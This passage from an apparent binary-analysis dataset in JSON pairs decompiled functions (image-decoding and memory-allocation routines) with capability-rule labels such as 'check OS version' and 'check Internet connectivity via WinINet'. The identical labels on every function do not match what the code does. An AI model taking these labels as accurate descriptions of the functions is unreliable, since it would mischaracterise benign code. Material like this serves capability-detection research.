        "decompiled_code": "\nvoid __fastcall fcn.00431cec(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x431d07;\n    fcn.00403ae4();\n    puVar2 = 0x4a2150;\n    puVar3 = param_2;\n    for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    param_2[0x2e] = param_2;\n    puStack24 = 0x431d3b;\n    fcn.00432d8c();\n    uStack28 = 0x431edc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    param_2[0x21] = 0x431bd4;\n    param_2[0x26] = in_EAX;\n    param_2[0x30] = param_2 + 0x21;\n    uVar4 = 0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0041b4ac(0, 0);\n    fcn.004344f8();\n    fcn.00433054();\n    param_2[0x3a] = 1;\n    param_2[0x3b] = 1 << (*(in_EAX + 0x43) & 0x1f);\n    param_2[0x42] = -(*(in_EAX + 0x3c) != '\\0');\n    if (*(in_EAX + 0x3d) != '\\0') {\n        param_2[0x39] = 1;\n    }\n    if ((*(in_EAX + 0x3e) == '\\x01') || (param_2[0x39] == 1)) {\n        param_2[0x43] = 0xffffffff;\n        param_2[0x46] = 0xec;\n    }\n    if (*(in_EAX + 0x42) == '\\x01') {\n        param_2[0x40] = 1;\n        param_2[0x45] = 0;\n        param_2[0x44] = 1;\n    }\n    param_2[0x2b] = param_2[0x40];\n    *(param_2 + 0x2c) = '\\x01' - (param_2[0x45] == 0);\n    param_2[0x2d] = param_2[0x44];\n    if (*(in_EAX + 0x40) != '\\0') {\n        iVar1 = fcn.004331a0();\n        if (iVar1 != 0) {\n            param_2[0x49] = param_2[0x45];\n            param_2[0x40] = 1;\n            param_2[0x45] = 0;\n            param_2[0x44] = 1;\n            param_2[0x3e] = 0xffffffff;\n        }\n    }\n    *in_FS_OFFSET = uVar4;\n    return;\n}\n",
        "token_count": 797
    },
    "00431efc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431efc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint var_288h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint var_160h;\n    uint var_15ch;\n    \n    if (*(in_EAX + 0x44) != '\\0') {\n        puStack660 = 0x431f1b;\n        fcn.00431cec();\n        uStack664 = 0x431f7b;\n        uStack668 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd64;\n        puStack660 = &stack0xfffffffc;\n        fcn.004349a0();\n        *(in_EAX + 0x30) = var_160h;\n        *(in_EAX + 0x34) = var_15ch;\n        iVar1 = fcn.004331a0();\n        *(in_EAX + 0x41) = '\\x01' - (iVar1 == 0);\n        *in_FS_OFFSET = uStack668;\n        puStack660 = 0x431f82;\n        uStack664 = 0x431f7a;\n        fcn.00431cc8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "00431f90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00431f90(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint uStack776;\n    uint uStack772;\n    uchar *puStack768;\n    uint uStack764;\n    uint *puStack760;\n    uint uStack740;\n    uint uStack736;\n    uchar *puStack732;\n    uint uStack720;\n    uint uStack716;\n    uchar *puStack712;\n    uint uStack708;\n    uint uStack704;\n    uchar *puStack700;\n    uint var_2a8h;\n    uint var_298h;\n    uint var_214h;\n    int32_t var_200h;\n    uint *var_1e0h;\n    uint *var_1d8h;\n    uint var_1c4h;\n    uint32_t var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint32_t var_104h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puStack712 = &stack0xfffffffc;\n    puStack700 = 0x431fb1;\n    var_4h = in_EAX;\n    fcn.00403ae4();\n    puVar5 = 0x4a2150;\n    puVar6 = &fcn.00431f90::var_298h;\n    for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    var_1e0h = &fcn.00431f90::var_298h;\n    puStack700 = 0x431fe4;\n    fcn.0043f2d8();\n    uStack704 = 0x4322fc;\n    uStack708 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd3c;\n    uStack716 = 0x4322c5;\n    uStack720 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd30;\n    var_214h = 0x431bd4;\n    var_200h = var_4h;\n    var_1d8h = &fcn.00431f90::var_214h;\n    puVar1 = &stack0xfffffffc;\n    puStack700 = &stack0xfffffffc;\n    if (*(*(var_4h + 0x28) + 8) != 0) {\n        puStack700 = &stack0xfffffffc;\n        fcn.00432a2c();\n        puVar1 = puStack712;\n    }\n    puStack712 = puVar1;\n    uVar2 = fcn.00404610();\n    *(*(var_4h + 0x28) + 8) = uVar2;\n    uVar2 = 0;\n    puStack732 = 0x432055;\n    fcn.0041b4ac(0, 0);\n    puStack732 = 0x432069;\n    fcn.0043e6ac();\n    if (*(var_4h + 0x2c) != NULL) {\n        puStack732 = 0x43207a;\n        iVar3 = (**(**(var_4h + 0x2c) + 0x2c))();\n        if (iVar3 != 0) {\n            puStack732 = 0x432089;\n            iVar3 = (**(**(var_4h + 0x2c) + 0x20))();\n            if (iVar3 != 0) {\n                puStack732 = 0x4320aa;\n                var_1c4h = (**(**(var_4h + 0x2c) + 0x2c))();\n                puStack732 = 0x4320bb;\n                uVar2 = (**(**(var_4h + 0x2c) + 0x2c))();\n                *(*(var_4h + 0x28) + 0x10) = uVar2;\n                puStack732 = 0x4320cf;\n                var_1c0h = (**(**(var_4h + 0x2c) + 0x20))();\n                puStack732 = 0x4320e0;\n                uVar2 = (**(**(var_4h + 0x2c) + 0x20))();\n                *(*(var_4h + 0x28) + 0xc) = uVar2;\n                var_1bch = 3;\n                var_1b8h = 2;\n                puStack732 = 0x432109;\n                var_10h = fcn.0042cbe0();\n                uStack736 = 0x4322b4;\n                uStack740 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffd1c;\n                puStack732 = &stack0xfffffffc;\n                (**(*var_10h + 8))();\n                fcn.0042e134();\n                fcn.0043e904();\n                fcn.0043e808();\n                if (*(var_4h + 0x3d) != '\\0') {\n                    *(*(var_4h + 0x28) + 0x14) = 1;\n                    fcn.0043ea78();\n                }\n                if (*(var_4h + 0x41) != '\\0') {\n                    fcn.0043eee0();\n                }\n                var_ch = fcn.0042d324();\n                iVar3 = fcn.0042d324();\n                uVar4 = iVar3 - var_ch;\n                if ((uVar4 < 1) || ((uVar4 & 3) != 0)) {\n                    var_8h = 1;\n                }\n                else {\n                    var_8h = var_1c0h;\n                }\n                puStack760 = 0x4321db;\n                fcn.004181c0(&fcn.00431f90::var_2a8h, 0);\n                puStack760 = &fcn.00431f90::var_2a8h;\n                uStack764 = 0;\n                puStack768 = 0x4321f5;\n                fcn.0040483c();\n                uStack772 = 0x432297;\n                uStack776 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffcf8;\n                puStack768 = &stack0xfffffffc;\n                fcn.0043f0f8();\n                while (var_104h < var_1c0h) {\n                    iVar3 = fcn.0043f16c();\n                    var_ch = var_ch + uVar4 * iVar3;\n                }\n                fcn.0043f3f8();\n                *in_FS_OFFSET = uStack776;\n                puStack768 = 0x43229e;\n                uStack772 = 0x432258;\n                iVar3 = fcn.00402f74();\n                if (iVar3 == 0) {\n                    uStack772 = 100;\n                }\n                else {\n                    uStack772 = 0;\n                }\n                uStack776 = 0;\n                fcn.004181c0(&fcn.00431f90::var_2a8h, 0);\n                fcn.0040483c(0, &fcn.00431f90::var_2a8h);\n                return;\n            }\n        }\n    }\n    *in_FS_OFFSET = uVar2;\n    uStack720 = 0x43209a;\n    fcn.00404f60();\n    return;\n}\n",
        "token_count": 1772
    },
    "004324c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004324c0(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uVar6;\n    int32_t in_stack_fffffd08;\n    int32_t iStack756;\n    uint uStack752;\n    uchar *puStack748;\n    uint uStack744;\n    uint *puStack740;\n    int32_t iStack720;\n    uint uStack716;\n    uchar *puStack712;\n    int32_t iStack708;\n    uint uStack704;\n    uchar *puStack700;\n    uint var_2a8h;\n    uint var_298h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    int32_t var_1d8h;\n    int32_t var_1b4h;\n    int32_t var_1a0h;\n    uint var_198h;\n    uint var_188h;\n    uint var_184h;\n    uint var_170h;\n    uint32_t var_16ch;\n    uint var_160h;\n    int32_t var_158h;\n    uint32_t var_154h;\n    uint var_150h;\n    int32_t var_dh;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    puStack712 = &stack0xfffffffc;\n    var_8h = in_EAX[0xb];\n    if (var_8h == NULL) {\n        puStack700 = 0x4324f2;\n        var_4h = in_EAX;\n        iVar3 = fcn.0042cbe0();\n        var_4h[0xb] = iVar3;\n        var_8h = var_4h[0xb];\n        var_dh._0_1_ = '\\x01';\n        puStack700 = 0x432513;\n        fcn.00431cec();\n        uStack704 = 0x4328bd;\n        iStack708 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd3c;\n        uStack716 = 0x43288e;\n        iStack720 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd30;\n        puStack700 = &stack0xfffffffc;\n        fcn.0042ddc8();\n        if ((*(var_4h + 0x3e) == '\\x01') || (var_1b4h == 1)) {\n            fcn.0042e134();\n        }\n        else {\n            fcn.0042e134();\n        }\n        puStack740 = 0x432582;\n        fcn.004181c0(&fcn.004324c0::var_2a8h, 0);\n        puStack740 = &fcn.004324c0::var_2a8h;\n        uStack744 = 0;\n        puStack748 = 0x43259c;\n        fcn.0040483c();\n        uStack752 = 0x43287d;\n        iStack756 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd0c;\n        iVar3 = var_4h[0xe];\n        puStack748 = &stack0xfffffffc;\n        if (iVar3 != 0) {\n            if (*(var_4h + 0x3e) == '\\x01') {\n                puStack748 = &stack0xfffffffc;\n                fcn.00432434();\n                fcn.0042c970();\n                in_stack_fffffd08 = 0x4325e2;\n                (**(*var_4h[0xb] + 0x38))();\n                var_dh._0_1_ = '\\0';\n            }\n            else {\n                puStack748 = &stack0xfffffffc;\n                sub.gdi32.dll_DeleteObject();\n                var_4h[0xe] = 0;\n                in_stack_fffffd08 = iVar3;\n            }\n        }\n        fcn.00434564();\n        piVar1 = var_4h[0xb];\n        fcn.0042ddc8();\n        (**(*piVar1 + 0x40))();\n        (**(*piVar1 + 0x34))();\n        *NULL = fcn.0042d324();\n        iVar3 = fcn.0042d324();\n        iVar3 = iVar3 - stack0xfffffff0;\n        if (var_1a0h != 0) {\n            while (iVar4 = fcn.004330c0(),  iVar4 != 2) {\n                fcn.00434828();\n                if ((((*(var_1d8h + 0xc) == 0) && (var_158h != 0)) && (cVar2 = fcn.0042d2a0(),  cVar2 == '\\x03')) &&\n                   (var_dh != '\\0')) {\n                    fcn.00432388();\n                    (**(*var_4h[0xb] + 0x38))();\n                    *(var_4h + 0x22) = 1;\n                }\n                *NULL = fcn.0042d324();\n                while (var_154h < var_16ch) {\n                    iVar4 = fcn.004346ec();\n                    unique0x00007a00 = stack0xfffffff0 + iVar3 * iVar4;\n                }\n                fcn.00434888();\n            }\n            var_198h = var_1ech;\n            var_188h = var_1e4h;\n            if (var_1e8h != '\\0') {\n                var_184h = 0xffffffff;\n                var_158h = 0;\n            }\n            fcn.00434828();\n            *NULL = fcn.0042d324();\n        }\n        if (((var_1a0h == 0) || (var_1e8h != '\\0')) && ((var_158h != 0 && (var_dh != '\\0')))) {\n            fcn.00432388();\n            (**(*var_4h[0xb] + 0x38))();\n            *(var_4h + 0x22) = 1;\n            *NULL = fcn.0042d324();\n        }\n        while (var_154h < var_16ch) {\n            iVar4 = fcn.004346ec();\n            unique0x00007a00 = stack0xfffffff0 + iVar3 * iVar4;\n        }\n        if (var_1a0h != 0) {\n            fcn.00434888();\n        }\n        fcn.004331d4();\n        *in_FS_OFFSET = in_stack_fffffd08;\n        uStack752 = 0x432884;\n        iStack756 = 0x432822;\n        iVar3 = fcn.00402f74();\n        if (iVar3 == 0) {\n            iStack756 = 100;\n        }\n        else {\n            iStack756 = 0;\n        }\n        uVar5 = *(var_4h + 0x22);\n        uVar6 = 0;\n        arg_8h = &fcn.004324c0::var_2a8h;\n        fcn.004181c0(arg_8h, 0);\n        fcn.0040483c(0, &fcn.004324c0::var_2a8h, arg_8h, uVar6, uVar5);\n        if (*(var_4h + 0x22) != '\\0') {\n            var_4h = (**(*var_4h + 0x10))();\n        }\n        return var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 1762
    },
    "004329bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004329bc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(*(in_EAX + 0x28) + 8) == 0) {\n        fcn.00431f90();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00432e6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432e6c(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EAX;\n    \n    iVar1 = in_EAX[9];\n    if (iVar1 == 1) {\n        in_EAX[10] = 1;\n        in_EAX[0xb] = 1;\n    }\n    else if (iVar1 == 3) {\n        if (in_EAX[0x46] == 0) {\n            if (in_EAX[0x49] == 0) {\n                piVar2 = in_EAX[0x36];\n                iVar1 = *piVar2;\n                iVar3 = piVar2[0x15];\n                iVar4 = piVar2[0x2a];\n                if (((iVar1 == 1) && (iVar3 == 2)) && (iVar4 == 3)) {\n                    in_EAX[10] = 3;\n                }\n                else if (((iVar1 == 0x52) && (iVar3 == 0x47)) && (iVar4 == 0x42)) {\n                    in_EAX[10] = 2;\n                }\n                else {\n                    iVar5 = *in_EAX;\n                    *(iVar5 + 0x18) = iVar1;\n                    *(iVar5 + 0x1c) = iVar3;\n                    *(iVar5 + 0x20) = iVar4;\n                    *(*in_EAX + 0x14) = 0x6f;\n                    (**(*in_EAX + 4))();\n                    in_EAX[10] = 3;\n                }\n            }\n            else if (*(in_EAX + 0x4a) == '\\0') {\n                in_EAX[10] = 2;\n            }\n            else if (*(in_EAX + 0x4a) == '\\x01') {\n                in_EAX[10] = 3;\n            }\n            else {\n                iVar1 = *in_EAX;\n                *(iVar1 + 0x14) = 0x72;\n                *(iVar1 + 0x18) = *(in_EAX + 0x4a);\n                (**(*in_EAX + 4))();\n                in_EAX[10] = 3;\n            }\n        }\n        else {\n            in_EAX[10] = 3;\n        }\n        in_EAX[0xb] = 2;\n    }\n    else if (iVar1 == 4) {\n        if (in_EAX[0x49] == 0) {\n            in_EAX[10] = 4;\n        }\n        else if (*(in_EAX + 0x4a) == '\\0') {\n            in_EAX[10] = 4;\n        }\n        else if (*(in_EAX + 0x4a) == '\\x02') {\n            in_EAX[10] = 5;\n        }\n        else {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x72;\n            *(iVar1 + 0x18) = *(in_EAX + 0x4a);\n            (**(*in_EAX + 4))();\n            in_EAX[10] = 5;\n        }\n        in_EAX[0xb] = 4;\n    }\n    else {\n        in_EAX[10] = 0;\n        in_EAX[0xb] = 0;\n    }\n    in_EAX[0xc] = 1;\n    in_EAX[0xd] = 1;\n    in_EAX[0xe] = 0;\n    in_EAX[0xf] = 0x3ff00000;\n    in_EAX[0x10] = 0;\n    in_EAX[0x11] = 0;\n    in_EAX[0x12] = 2;\n    in_EAX[0x13] = 1;\n    in_EAX[0x14] = 1;\n    in_EAX[0x15] = 0;\n    in_EAX[0x16] = 2;\n    in_EAX[0x17] = 1;\n    in_EAX[0x18] = 0x100;\n    in_EAX[0x22] = 0;\n    in_EAX[0x19] = 0;\n    in_EAX[0x1a] = 0;\n    in_EAX[0x1b] = 0;\n    return;\n}\n",
        "token_count": 1001
    },
    "004331d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004331d4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (((in_EAX[5] == 0xcd) || (in_EAX[5] == 0xce)) && (in_EAX[0x10] == 0)) {\n        if (in_EAX[0x23] < in_EAX[0x1d]) {\n            *(*in_EAX + 0x14) = 0x43;\n            (***in_EAX)();\n        }\n        (**(in_EAX[0x69] + 4))();\n        in_EAX[5] = 0xd2;\n    }\n    else if (in_EAX[5] == 0xcf) {\n        in_EAX[5] = 0xd2;\n    }\n    else if (in_EAX[5] != 0xd2) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    do {\n        if (*(in_EAX[0x6d] + 0x14) != 0) {\n            (**(in_EAX[6] + 0x18))();\n            fcn.0043e54c();\n            return 1;\n        }\n        iVar1 = (**in_EAX[0x6d])();\n    } while (iVar1 != 0);\n    return 0;\n}\n",
        "token_count": 339
    },
    "00433298": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00433298(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_EAX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    \n    iVar1 = in_EAX[1];\n    if (0x3b9ac9f4 < param_1) {\n        fcn.00433284();\n    }\n    if ((param_1 & 7) != 0) {\n        param_1 = param_1 + (8 - (param_1 & 7));\n    }\n    if ((param_2 < 0) || (1 < param_2)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    puVar3 = NULL;\n    for (puVar5 = *(iVar1 + 0x34 + param_2 * 4); (puVar5 != NULL && (puVar5[2] <= param_1 && param_1 != puVar5[2]));\n        puVar5 = *puVar5) {\n        puVar3 = puVar5;\n    }\n    if (puVar5 == NULL) {\n        if (puVar3 == NULL) {\n            uVar6 = *(param_2 * 4 + 0x4a21d4);\n        }\n        else {\n            uVar6 = *(param_2 * 4 + 0x4a21dc);\n        }\n        uVar4 = 1000000000 - (param_1 + 0xc);\n        if (uVar4 < uVar6) {\n            uVar6 = uVar4;\n        }\n        while (puVar5 = fcn.00433ea4(),  puVar5 == NULL) {\n            uVar6 = uVar6 / 2;\n            if (uVar6 < 0x32) {\n                fcn.00433284();\n            }\n        }\n        *(iVar1 + 0x4c) = param_1 + 0xc + uVar6 + *(iVar1 + 0x4c);\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        puVar5[2] = uVar6 + param_1;\n        if (puVar3 == NULL) {\n            *(iVar1 + 0x34 + param_2 * 4) = puVar5;\n        }\n        else {\n            *puVar3 = puVar5;\n        }\n    }\n    iVar1 = puVar5[1];\n    puVar5[1] = puVar5[1] + param_1;\n    puVar5[2] = puVar5[2] - param_1;\n    return puVar5 + iVar1 + 0xc;\n}\n",
        "token_count": 660
    },
    "004333c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004333c8(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if (0x3b9ac9f4 < param_1) {\n        fcn.00433284();\n    }\n    if ((param_1 & 7) != 0) {\n        param_1 = param_1 + (8 - (param_1 & 7));\n    }\n    if ((param_2 < 0) || (1 < param_2)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.00433eb4();\n    if (puVar3 == NULL) {\n        fcn.00433284();\n    }\n    *(iVar1 + 0x4c) = *(iVar1 + 0x4c) + param_1 + 0xc;\n    *puVar3 = *(iVar1 + 0x3c + param_2 * 4);\n    puVar3[1] = param_1;\n    puVar3[2] = 0;\n    *(iVar1 + 0x3c + param_2 * 4) = puVar3;\n    return CONCAT44(param_2, puVar3 + 3);\n}\n",
        "token_count": 348
    },
    "00433884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433884(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(param_2 + 8);\n    iStack16 = *(param_2 + 0x18) * iVar1;\n    iVar4 = 0;\n    while( true ) {\n        if (*(param_2 + 0x10) <= iVar4) {\n            return;\n        }\n        if (*(param_2 + 0x14) < *(param_2 + 0x10) - iVar4) {\n            iVar2 = *(param_2 + 0x14);\n        }\n        else {\n            iVar2 = *(param_2 + 0x10) - iVar4;\n        }\n        iVar3 = *(param_2 + 0x18) + iVar4;\n        if (*(param_2 + 0x1c) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 0x1c) - iVar3;\n        }\n        if (*(param_2 + 4) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 4) - iVar3;\n        }\n        if (iVar2 < 1) break;\n        iVar2 = iVar2 * iVar1;\n        if (param_1 == 0) {\n            (**(param_2 + 0x30))(iVar2, iStack16);\n        }\n        else {\n            (**(param_2 + 0x34))(iVar2, iStack16);\n        }\n        iStack16 = iStack16 + iVar2;\n        iVar4 = iVar4 + *(param_2 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "00433930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433930(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(param_2 + 8) * 0x80;\n    iStack16 = *(param_2 + 0x18) * iVar1;\n    iVar4 = 0;\n    while( true ) {\n        if (*(param_2 + 0x10) <= iVar4) {\n            return;\n        }\n        if (*(param_2 + 0x14) < *(param_2 + 0x10) - iVar4) {\n            iVar2 = *(param_2 + 0x14);\n        }\n        else {\n            iVar2 = *(param_2 + 0x10) - iVar4;\n        }\n        iVar3 = *(param_2 + 0x18) + iVar4;\n        if (*(param_2 + 0x1c) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 0x1c) - iVar3;\n        }\n        if (*(param_2 + 4) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 4) - iVar3;\n        }\n        if (iVar2 < 1) break;\n        iVar2 = iVar2 * iVar1;\n        if (param_1 == 0) {\n            (**(param_2 + 0x30))(iVar2, iStack16);\n        }\n        else {\n            (**(param_2 + 0x34))(iVar2, iStack16);\n        }\n        iStack16 = iStack16 + iVar2;\n        iVar4 = iVar4 + *(param_2 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "004339e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004339e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = in_ECX + arg_ch;\n    if (((in_EDX[1] <= uVar3 && uVar3 != in_EDX[1]) || (in_EDX[3] <= arg_ch && arg_ch != in_EDX[3])) || (*in_EDX == 0))\n    {\n        *(*in_EAX + 0x14) = 0x16;\n        (***in_EAX)();\n    }\n    if ((in_ECX < in_EDX[6]) || (in_EDX[6] + in_EDX[4] < uVar3)) {\n        if (in_EDX[10] == 0) {\n            *(*in_EAX + 0x14) = 0x45;\n            (***in_EAX)();\n        }\n        if (in_EDX[9] != 0) {\n            fcn.00433884();\n            in_EDX[9] = 0;\n        }\n        if (in_ECX < in_EDX[6] || in_ECX == in_EDX[6]) {\n            iVar1 = uVar3 - in_EDX[4];\n            if (iVar1 < 0) {\n                iVar1 = 0;\n            }\n            in_EDX[6] = iVar1;\n        }\n        else {\n            in_EDX[6] = in_ECX;\n        }\n        fcn.00433884();\n    }\n    if (in_EDX[7] < uVar3) {\n        if (in_EDX[7] < in_ECX) {\n            uVar2 = in_ECX;\n            if (arg_8h != 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            uVar2 = in_EDX[7];\n        }\n        if (arg_8h != 0) {\n            in_EDX[7] = uVar3;\n        }\n        if (in_EDX[8] == 0) {\n            if (arg_8h == 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            iVar1 = in_EDX[6];\n            for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {\n                fcn.0043e53c();\n            }\n        }\n    }\n    if (arg_8h != 0) {\n        in_EDX[9] = 1;\n    }\n    return (in_ECX - in_EDX[6]) * 4 + *in_EDX;\n}\n",
        "token_count": 687
    },
    "00433b24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
